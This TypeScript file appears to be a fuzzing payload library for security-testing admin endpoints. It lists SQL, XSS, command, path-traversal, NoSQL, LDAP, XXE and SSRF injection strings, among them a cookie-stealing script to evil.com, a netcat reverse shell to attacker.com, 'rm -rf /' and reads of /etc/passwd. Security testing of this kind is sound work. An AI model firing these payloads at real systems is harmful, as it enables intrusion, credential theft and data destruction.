/**
 * ADMIN INJECTION PAYLOADS
 * All malicious inputs for fuzzing admin endpoints
 */

export class AdminInjectionPayloads {
    /**
     * SQL injection payloads
     */
    static get SQLInjection(): string[] {
        return [
            "' OR '1'='1",
            "1' AND 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1#",
            "1' WAITFOR DELAY '00:00:05'--",
            "admin' OR 'a'='a",
            "' OR 'x'='x",
            "1' ORDER BY 1--",
            "' UNION SELECT NULL--",
            "')) OR (('",
            "1' AND SLEEP(5)--"
        ];
    }

    /**
     * XSS payloads
     */
    static get XSSPayloads(): string[] {
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<img src="x" onerror="alert(document.cookie)">',
            '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
            '<svg/onload=alert(1)>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '\'"--></style></script><script>alert(1)</script>'
        ];
    }

    /**
     * Command injection payloads
     */
    static get CommandInjection(): string[] {
        return [
            '; ls -la',
            '| whoami',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd',
            '&& echo vulnerable',
            '|| echo vulnerable',
            '; rm -rf /',
            '| nc -e /bin/sh attacker.com 4444'
        ];
    }

    /**
     * Path traversal payloads
     */
    static get PathTraversal(): string[] {
        return [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..;/..;/..;/etc/passwd',
            '/etc/passwd',
            'C:\\Windows\\System32\\config\\SAM',
            '../../../../../../../../../../etc/passwd'
        ];
    }

    /**
     * Unicode exploits
     */
    static get UnicodeExploits(): string[] {
        return [
            '\u0000', // Null byte
            '\uFEFF', // BOM
            '\u202E', // Right-to-left override
            '𝕳𝖊𝖑𝖑𝖔', // Unicode variations
            'Ṫḧïṡ ïṡ ä ṫëṡẗ', // Diacritics
            '👨‍💻', // Emoji
            '\u001F', // Control character
            '\n\r\t', // Whitespace
            '\\x00\\x1F', // Hex encoded
            '%00', // URL encoded null
            String.fromCharCode(0), // Null char
            '\u200B\u200C\u200D', // Zero-width chars
            '\uD800\uDC00' // Surrogate pairs
        ];
    }

    /**
     * Extremely long strings (DoS)
     */
    static generateLongString(length: number): string {
        return 'A'.repeat(length);
    }

    /**
     * Binary blob
     */
    static generateBinaryBlob(): Buffer {
        return Buffer.from([0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD]);
    }

    /**
     * Deep object nesting
     */
    static generateDeepNesting(depth: number = 100): any {
        let obj: any = { value: 'malicious' };
        for (let i = 0; i < depth; i++) {
            obj = { nested: obj };
        }
        return obj;
    }

    /**
     * Massive array
     */
    static generateMassiveArray(size: number = 100000): any[] {
        return Array(size).fill('item');
    }

    /**
     * JSON bomb (exponential expansion)
     */
    static get JSONBomb(): string {
        let payload = '"a":';
        for (let i = 0; i < 20; i++) {
            payload = `{"${payload}${payload}"}`;
        }
        return payload;
    }

    /**
     * NoSQL injection
     */
    static get NoSQLInjection(): any[] {
        return [
            { $ne: null },
            { $gt: '' },
            { $regex: '.*' },
            { $where: 'true' },
            "' || '1'=='1",
            { $or: [{}, { 'a': 'a' }] }
        ];
    }

    /**
     * LDAP injection
     */
    static get LDAPInjection(): string[] {
        return [
            '*)(uid=*',
            'admin)(&(password=*',
            '*)(|(uid=*',
            '*))(|(uid=*'
        ];
    }

    /**
     * XML injection
     */
    static get XMLInjection(): string[] {
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<![CDATA[<script>alert(1)</script>]]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>'
        ];
    }

    /**
     * SSRF payloads
     */
    static get SSRFPayloads(): string[] {
        return [
            'http://127.0.0.1:5001/admin/users',
            'http://localhost/admin',
            'http://[::1]:5001/',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'gopher://127.0.0.1:25/'
        ];
    }
}
